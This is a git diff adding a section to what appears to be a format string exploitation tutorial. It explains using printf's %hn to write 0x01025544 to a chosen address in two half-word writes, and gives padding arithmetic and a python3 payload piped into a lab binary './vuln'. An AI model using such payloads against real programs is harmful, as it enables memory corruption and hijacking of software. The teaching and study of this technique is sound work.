@@ -97,7 +97,59 @@ This will print 60 byte + 4 (address) into pointer.
 
 ## Write complex value
 
-*section need to be write*
+### Problem
+
+If we want print complex value at specific address, imagine try print 0x01025544 at address 0x08049810.
+
+Lets suppose the program is 32bit little endian.
+
+0x01025544 = 16930116 (in decimal) 
+
+So we should print a large padding, and it could take to much time.
+
+### Theory
+
+There is a technique to print data in 2 byte with printf(): `%hn` (h for half).
+
+So let's focus first 0x0000(2 bytes) store at the address 08049810 then last 0x0000 08049810 + 2, fill them with respectively 0x5544 and 0x0102 (little endian). 
+
+### Exploit
+
+To sum up : 
+
+```py
+0x0102 = 258(in decimal) -> 08049810 + 2 + 08049812
+0x5544 = 21828(in decimal) -> 08049810
+```
+
+To adjust the padding, we can follow this rule : 
+
+`padding = [The value we want] - [The bytes alredy wrote] = [The value to set].`
+
+High order first cause the value is lower:
+
+High order 258 - 8 = 250 (both addresses are 4 bytes)
+
+Low order 21828 - 258 = 21570
+
+So final exploit is : 
+
+```py
+python3 -c 'import sys; sys.stdout.buffer.write(b"\x10\x98\x04\x08" + b"\x12\x98\x04\x08" + b"%250x" + b"%13$hn" + b"%21570x" + b"%12$hn")' | ./vuln
+```
+
+- `b"\x10\x98\x04\x08"` is the first address.
+- `b"\x12\x98\x04\x08"` is the second address.
+
+so `%12$x` point to first address and `%13$x` to the second.
+
+- `b"%250x"` is the first padding (remember 250 + 8 byte address = 258 = 0x102)
+- `b"%13$hn"` we store 258 inside the second address because its little endian.
+- `b"%21570x"` is the second padding (0x5544 - 0x102)
+- `b"%12$hn"` is the first address, we store the value.
+
+Bingo, `\x10\x98\x04\x08` point to 0x1025544 !
+
 
 ## Code execution redirect
 
